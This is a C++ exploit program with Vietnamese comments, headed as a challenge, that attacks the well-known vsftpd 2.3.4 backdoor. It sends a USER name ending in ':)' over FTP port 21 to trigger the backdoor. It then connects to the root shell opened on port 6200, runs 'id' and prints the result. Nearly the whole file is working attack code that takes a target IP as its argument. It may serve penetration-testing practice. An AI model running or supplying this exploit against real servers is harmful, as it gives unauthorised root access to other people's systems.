//thử thách: xây dựng chương trình khai thác và tấn công lỗ hổng vsftpd 2.3.4
#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

using namespace std;

// Hàm kích hoạt backdoor qua cổng 21
bool trigger_backdoor(const char* ip) {
    int sock = 0;
    struct sockaddr_in serv_addr;
    char buffer[1024] = {0};

    // Tạo socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        cout << "\n Lỗi tạo socket" << endl;
        return false;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(21);

    // Chuyển đổi IP sang dạng binary
    if (inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
        cout << "\n Địa chỉ IP không hợp lệ" << endl;
        return false;
    }

    // Kết nối tới cổng 21
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        cout << "\n Kết nối tới cổng 21 thất bại!" << endl;
        return false;
    }

    // Đọc banner từ server
    read(sock, buffer, 1024);
    cout << "[*] Banner: " << buffer;

    // Gửi "Magic Payload" :)
    const char* user_payload = "USER backdoored:)\r\n";
    const char* pass_payload = "PASS password\r\n";

    send(sock, user_payload, strlen(user_payload), 0);
    send(sock, pass_payload, strlen(pass_payload), 0);

    cout << "[+] Đã gửi payload kích hoạt. Đợi 1 giây..." << endl;
    sleep(1); 

    close(sock);
    return true;
}

// Hàm kết nối tới shell vừa mở trên cổng 6200
void connect_shell(const char* ip) {
    int sock = 0;
    struct sockaddr_in serv_addr;
    
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) return;

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(6200); // Cổng backdoor mặc định

    inet_pton(AF_INET, ip, &serv_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) >= 0) {
        cout << "[***] THÀNH CÔNG! Đã chiếm được Root Shell." << endl;
        
        // Tương tác đơn giản: Gửi lệnh 'id' để kiểm tra
        const char* cmd = "id\n";
        send(sock, cmd, strlen(cmd), 0);
        
        char buffer[1024] = {0};
        read(sock, buffer, 1024);
        cout << "[!] Kết quả: " << buffer << endl;
    } else {
        cout << "[-] Không thể kết nối cổng 6200. Có lỗi xảy ra." << endl;
    }
    close(sock);
}

int main(int argc, char const *argv[]) {
    if (argc < 2) {
        cout << "Cách dùng: ./exploit <IP_TARGET>" << endl;
        return -1;
    }

    if (trigger_backdoor(argv[1])) {
        connect_shell(argv[1]);
    }

    return 0;
}